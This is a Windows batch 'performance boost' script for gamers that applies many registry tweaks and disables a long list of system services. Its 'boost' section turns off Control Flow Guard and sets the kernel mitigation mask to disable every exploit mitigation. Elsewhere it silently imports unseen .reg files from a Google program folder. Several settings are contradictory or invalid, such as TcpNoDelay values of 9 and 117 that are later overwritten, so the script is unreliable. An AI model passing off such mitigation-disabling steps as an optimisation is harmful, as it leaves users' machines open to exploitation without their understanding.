Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Priority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Latency Sensitive" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "GPU Priority" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Background Only" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Priority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "GPU Priority" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Priority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "GPU Priority" /t REG_DWORD /d "5" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Reliability" /v "TimeStampInterval" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\cdrom" /v "AutoRun" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "IRQ8Priority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "Class" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "DnsPriority" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "HostsPriority" /t REG_DWORD /d "5" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "LocalPriority" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "NetbtPriority" /t REG_DWORD /d "7" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters" /v "SizReqBuf" /t REG_DWORD /d "17424" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\LanmanWorkstation\Parameters" /v "DisableBandwidthThrottling" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\LanmanWorkstation\Parameters" /v "DisableLargeMtu" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\LanmanWorkstation\Parameters" /v "MaxCmds" /t REG_DWORD /d "30" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\LanmanWorkstation\Parameters" /v "MaxThreads" /t REG_DWORD /d "30" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\LanmanWorkstation\Parameters" /v "MaxCollectionCount" /t REG_DWORD /d "32" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\LanmanWorkstation\Parameters" /v "KeepConn" /t REG_DWORD /d "86400" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Psched" /v "NonBestEffortLimit" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "MouseDataQueueSize" /t REG_DWORD /d "50" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "WppRecorder_TraceGuid" /t REG_SZ /d "{fc8df8fd-d105-40a9-af75-2eec294adf8d}" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "MouseDataQueueSize" /t REG_DWORD /d "46" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "WppRecorder_TraceGuid" /t REG_SZ /d "{fc8df8fd-d105-40a9-af75-2eec294adf8d}" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "MouseDataQueueSize" /t REG_DWORD /d "42" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "WppRecorder_TraceGuid" /t REG_SZ /d "{fc8df8fd-d105-40a9-af75-2eec294adf8d}" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "MouseDataQueueSize" /t REG_DWORD /d "38" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "WppRecorder_TraceGuid" /t REG_SZ /d "{fc8df8fd-d105-40a9-af75-2eec294adf8d}" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "MouseDataQueueSize" /t REG_DWORD /d "34" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "WppRecorder_TraceGuid" /t REG_SZ /d "{fc8df8fd-d105-40a9-af75-2eec294adf8d}" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "MouseDataQueueSize" /t REG_DWORD /d "30" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "WppRecorder_TraceGuid" /t REG_SZ /d "{fc8df8fd-d105-40a9-af75-2eec294adf8d}" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "MouseDataQueueSize" /t REG_DWORD /d "26" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "WppRecorder_TraceGuid" /t REG_SZ /d "{fc8df8fd-d105-40a9-af75-2eec294adf8d}" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "MouseDataQueueSize" /t REG_DWORD /d "22" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "WppRecorder_TraceGuid" /t REG_SZ /d "{fc8df8fd-d105-40a9-af75-2eec294adf8d}" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "MouseDataQueueSize" /t REG_DWORD /d "18" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "WppRecorder_TraceGuid" /t REG_SZ /d "{fc8df8fd-d105-40a9-af75-2eec294adf8d}" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "MouseDataQueueSize" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "WppRecorder_TraceGuid" /t REG_SZ /d "{fc8df8fd-d105-40a9-af75-2eec294adf8d}" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "ConvertibleSlateMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "256" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "AutoRepeatDelay" /t REG_SZ /d "1000" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "AutoRepeatRate" /t REG_SZ /d "500" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "BounceTime" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "DelayBeforeAcceptance" /t REG_SZ /d "1000" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "Flags" /t REG_SZ /d "126" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "Last BounceKey Setting" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "Last Valid Delay" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "Last Valid Repeat" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "Last Valid Wait" /t REG_DWORD /d "1000" /f
REM Setting By HELIOS
REM Setting By HELIOS
REM Setting By HELIOS
REM Setting By HELIOS
REM Setting By HELIOS
REM Setting By PowerPunch
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "9" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpAckFrequency" /t REG_DWORD /d "9" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpDelAckTicks" /t REG_DWORD /d "9" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Psched" /v "NonBestEffortLimit" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "117" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpAckFrequency" /t REG_DWORD /d "117" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpAckFrequency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\FiveM.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\FiveM_GTAProcess.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v "VisualFXSetting" /t REG_DWORD /d "3" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\AnimateMinMax" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ComboBoxAnimation" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ControlAnimations" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\CursorShadow" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DragFullWindows" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DropShadow" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DWMAeroPeekEnabled" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DWMEnabled" /v "DefaultApplied" /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DWMSaveThumbnailEnabled" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\FontSmoothing" /v "DefaultApplied" /t REG_SZ /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ListBoxSmoothScrolling" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ListviewAlphaSelect" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ListviewShadow" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\MenuAnimation" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\SelectionFade" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\TaskbarAnimations" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ThumbnailsOrIcon" /v "DefaultApplied" /t REG_SZ /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\TooltipAnimation" /v "DefaultApplied" /t REG_SZ /d "0" /f
Reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v "LastKey" /f
Reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v "View" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "ConvertibleSlateMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "38" /f
cd C:\Program Files\Google
start hkcr.reg
start hkcu.reg
start hkcm.reg
ping -n 2 127.0.0.1>nul
echo Disable Gamemode
cls
echo shutdown
SET /p choix="%%b[31m[%%b[33mWPARK%%b[31m]%%b[33m PRESS NUMBER USE  >  "
if %choix%== 1 Goto :shd
if %choix%== 2 Goto :menu
timeout 10
goto menu
:shd
title shutdown
echo shutdown
timeout 3
shutdown -s -t 1
taskkill cmd

:sh
echo loadding
ping -n 4 127.0.0.1>nul
exit


:boost
title boost
@echo off
setlocal EnableDelayedExpansion

DISM > nul 2>&1 || echo error: administrator privileges required && pause && exit /b 1

:: initialize mask to get mask length
PowerShell Set-ProcessMitigation -System -Disable CFG
if not !errorlevel! == 0 (
    echo error: unsupported windows version
    echo info: press any key to continue
    pause > nul 2>&1
    exit /b 1
)

:: get current mask
for /f "tokens=3 skip=2" %%a in ('reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "MitigationAuditOptions"') do (
    set "mitigation_mask=%%a"
)

echo info: current mask - !mitigation_mask!

:: set all values in current mask to 2 (disable all mitigations)
for /L %%a in (0,1,9) do (
    set "mitigation_mask=!mitigation_mask:%%a=2!"
)

echo info: modified mask - !mitigation_mask!

:: apply mask to kernel
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "MitigationOptions" /t REG_BINARY /d "!mitigation_mask!" /f > nul 2>&1
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "MitigationAuditOptions" /t REG_BINARY /d "!mitigation_mask!" /f > nul 2>&1

echo info: done
echo info: press any key to continue
pause 
goto Question

:win11
chcp 65001
cls
title win11 Boost
echo only windows 11
SET /p choix="%%b[31m[%%b[33mWPARK%%b[31m]%%b[33m yes or No  >  "
if %choix%== yes Goto :Family
if %choix%== no Goto :menu
:Family
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "GlobalTimerResolutionRequests" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "AlpcWakePolicy" /t REG_DWORD /d "1" /f
REM ;"AlpcMessageLog"=dword:00000000
REM ; DPC Threading (MultiThreaded)
REM ;"ThreadDpcEnable"=dword:00000001
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "SplitLargeCaches" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "SimulateCommitSavings" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "TrackLockedPages" /t REG_DWORD /d "0" /f
ping -n 5 127.0.0.1>nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "TrackPtes" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DeepIoCoalescingEnabled" /t REG_DWORD /d "0" /f
goto menu

:roblox
cd c:
start C:\Users\siwat\AppData\Local\Roblox\Versions\version-3aba366803e44f0e\RobloxPlayerBeta.exe

:Notebook
cls
@echo off
echo Notebook onlY
pause
:: -----------------------------------------------------  !!! Unsupported Reg Type Found !!!  -----------------------------------------------------
REM ~ Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009" /v "NetworkInterfaceInstallTimestamp" /t REG_QWORD /d "0xf54709573e03da01" /f
:: ------------------------------------------------------------------------------------------------------------------------------------------------
:: changes services for most compatibility but disabling shit services
:: moved services above OptiZ so OptiZ isn't useless
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AarSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AJRouter" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ALG" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AppIDSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Appinfo" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AppMgmt" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AppReadiness" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AppVClient" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AppXSvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AssignedAccessManagerSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AudioEndpointBuilder" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Audiosrv" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\autotimesvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AxInstSV" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\BcastDVRUserService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\BFE" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\BITS" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\BluetoothUserService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\BrokerInfrastructure" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\BTAGService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\BthAvctpSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\bthserv" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\camsvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CaptureService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\cbdhsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CDPSvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CDPUserSvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CertPropSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ClipSVC" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\COMSysApp" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ConsentUxUserSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CoreMessagingRegistrar" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CredentialEnrollmentManagerUserSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CryptSvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CscService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DcomLaunch" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\defragsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DeviceAssociationBrokerSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DeviceAssociationService" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DeviceInstall" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DevicePickerUserSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DevicesFlowUserSvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DevQueryBroker" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Dhcp" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\diagnosticshub.standardcollector.service" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\diagsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DispBrokerDesktopSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DisplayEnhancementService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DmEnrollmentSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\dmwappushservice" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DoSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\dot3svc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DPS" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DsmSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DsSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DusmSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Eaphost" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\EFS" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\embeddedmode" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\EntAppSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\EventLog" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\EventSystem" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\fdPHost" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\FDResPub" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\fhsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\FontCache" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\FontCache3.0.0.0" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\FrameServer" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\gpsvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\GraphicsPerfSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\hidserv" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\HvHost" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\icssvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\IKEEXT" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\InstallService" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\iphlpsvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\IpxlatCfgSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\KeyIso" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\KtmRm" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\lfsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LicenseManager" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\lltdsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\lmhosts" /v "Start" /t REG_DWORD /d "4" /f
